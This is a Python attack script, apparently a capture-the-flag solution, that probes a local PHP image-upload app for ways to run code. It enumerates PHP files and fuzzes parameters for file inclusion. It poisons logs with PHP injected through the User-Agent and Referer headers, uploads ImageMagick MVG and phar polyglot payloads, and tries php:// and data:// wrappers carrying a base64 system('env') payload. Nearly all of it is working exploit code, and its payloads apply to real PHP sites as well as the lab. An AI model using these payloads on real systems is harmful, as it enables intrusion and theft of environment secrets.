import requests
import re

base_url = "http://127.0.0.1:33021"

# Minimal valid JPEG
minimal_jpeg = b'\xff\xd8\xff\xd9'

# Test 1: Check all PHP files we can find
print("[*] TEST 1: Enumerate PHP files")
php_files = [
    'index.php', 'upload.php', 'view.php', 'display.php', 
    'image.php', 'gallery.php', 'list.php', 'show.php',
    'get.php', 'read.php', 'process.php', 'api.php',
    'config.php', 'settings.php', 'functions.php'
]
for f in php_files:
    r = requests.get(f"{base_url}/{f}")
    if r.status_code != 404:
        print(f"[+] {f}: {r.status_code}")
        # Check for parameters
        if 'flag' in r.text.lower() or 'FLAG' in r.text:
            print(f"    [!!!] FLAG reference in {f}")

# Test 2: Check if index.php has include functionality
print("\n[*] TEST 2: Test index.php parameters")
params_to_test = [
    {'file': 'shell.jpg'},
    {'page': 'shell.jpg'},
    {'img': 'shell.jpg'},
    {'image': 'shell.jpg'},
    {'path': 'shell.jpg'},
    {'load': 'shell.jpg'},
    {'view': 'shell.jpg'},
    {'show': 'shell.jpg'},
    {'display': 'shell.jpg'},
    {'src': 'shell.jpg'},
    {'id': 'shell.jpg'},
    {'name': 'shell.jpg'},
    {'f': 'shell.jpg'},
    {'p': 'shell.jpg'},
]
for params in params_to_test:
    r = requests.get(f"{base_url}/index.php", params=params)
    if 'FLAG' in r.text or 'uid=' in r.text:
        print(f"[!!!] LFI FOUND: {params}")
        print(r.text[:500])

# Test 3: Check if there's a way to force PHP execution via Apache handlers
print("\n[*] TEST 3: Apache handler exploitation")
# Check if .htaccess can override handlers
r = requests.get(f"{base_url}/upload/.htaccess")
print(f"[+] .htaccess: {r.status_code}")

# Test 4: Check for log poisoning
print("\n[*] TEST 4: Log poisoning check")
# Try to inject PHP code into logs
headers = {
    'User-Agent': '<?php system("env"); ?>',
    'Referer': '<?php system("env"); ?>',
}
r = requests.get(f"{base_url}/", headers=headers)
print(f"[+] Request with PHP headers sent")

# Test 5: Check if there's an existing .user.ini
print("\n[*] TEST 5: Check for existing config files")
config_files = ['.user.ini', 'php.ini', '.htaccess', 'web.config']
for cf in config_files:
    r = requests.get(f"{base_url}/upload/{cf}")
    if r.status_code == 200:
        print(f"[!!!] {cf} EXISTS!")
        print(f"[+] Content: {r.text}")

# Test 6: Try to use image processing functions
print("\n[*] TEST 6: ImageMagick/GraphicsMagick exploitation")
# ImageMagick can execute code with certain payloads
imagick_payload = b'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:<?php system("env"); ?>'
pop graphic-context'''
files = {'userfile': ('exploit.mvg', minimal_jpeg + imagick_payload, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    print(f"[+] MVG uploaded: {filename}")

# Test 7: Check for phar deserialization
print("\n[*] TEST 7: Phar deserialization")
# Create a phar file
phar_stub = minimal_jpeg + b'<?php __HALT_COMPILER(); ?>'
files = {'userfile': ('exploit.phar.jpg', phar_stub, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    # Try to access via phar://
    r2 = requests.get(f"{base_url}/index.php", params={'file': f'phar://upload/{filename}'})
    print(f"[+] Phar test: {r2.status_code}")

# Test 8: Check the exact image display mechanism
print("\n[*] TEST 8: Analyze image display")
r = requests.get(f"{base_url}/index.php")
# Extract img src
img_match = re.search(r'<img[^>]+src=["\']([^"\']+)["\']', r.text)
if img_match:
    img_src = img_match.group(1)
    print(f"[+] Image src: {img_src}")
    # Check if there's processing
    r2 = requests.get(f"{base_url}/{img_src}")
    print(f"[+] Direct access: {r2.status_code}")
    print(f"[+] Content-Type: {r2.headers.get('Content-Type')}")

# Test 9: Try to use PHP wrappers
print("\n[*] TEST 9: PHP wrappers")
wrappers = [
    'php://filter/convert.base64-encode/resource=upload/shell.jpg',
    'php://input',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCJlbnYiKTs/Pg==',
]
for wrapper in wrappers:
    r = requests.get(f"{base_url}/index.php", params={'file': wrapper})
    if 'FLAG' in r.text or 'PATH=' in r.text or 'uid=' in r.text:
        print(f"[!!!] WRAPPER WORKS: {wrapper}")
        print(r.text[:500])

# Test 10: Check for file inclusion in existing pages
print("\n[*] TEST 10: Check for file inclusion patterns")
# Upload a file with specific marker
marker = b'MARKER_XYZ_123'
files = {'userfile': ('marker.jpg', minimal_jpeg + marker, 'image/jpeg')}
requests.post(f"{base_url}/index.php", files=files)

# Check various endpoints for inclusion
endpoints = ['/', '/index.php', '/upload/', '/upload/test.jpg']
for ep in endpoints:
    r = requests.get(f"{base_url}{ep}")
    if marker.decode() in r.text:
        print(f"[!!!] INCLUSION FOUND at {ep}")

